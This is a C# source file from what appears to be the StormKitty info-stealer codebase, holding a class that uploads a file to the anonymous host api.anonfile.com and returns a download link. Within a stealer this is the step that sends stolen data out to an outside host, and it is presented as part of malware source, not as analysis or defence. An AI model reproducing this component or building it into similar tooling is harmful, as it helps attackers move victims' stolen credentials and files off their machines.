using System;
using System.Windows.Forms;
using System.Net;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

namespace StormKitty
{
    internal sealed class AnonFiles
    {
   
         public static string CreateDownloadLink(string file, bool v)
        {
                string ReturnValue = string.Empty;
                try
                {
                    using (WebClient Client = new WebClient())
                    {
                    
                    byte[] Response = Client.UploadFile("https://api.anonfile.com/upload", file);
                        string ResponseBody = Encoding.ASCII.GetString(Response);
                  //  string ResponseBody = System.Text.Encoding.UTF8.GetString(Response);
                    if (ResponseBody.Contains("\"error\": {"))
                        {
                            ReturnValue += "There was a erorr while uploading the file.\r\n";
                            ReturnValue += "Error message: " + ResponseBody.Split('"')[7] + "\r\n";
                        }
                        else
                        {
                            ReturnValue += "Download link: " + ResponseBody.Split('"')[15] + "\r\n";
                            ReturnValue += "File name: " + ResponseBody.Split('"')[25] + "\r\n";
                        }
                    }
                }
                catch (Exception Exception)
                {
                    ReturnValue += "Exception Message:\r\n" + Exception.Message + "\r\n";
                }
                return ReturnValue;
            }

       

        internal static string CreateDownloadLink(string v)
        {
            throw new NotImplementedException();
        }
    }
    }

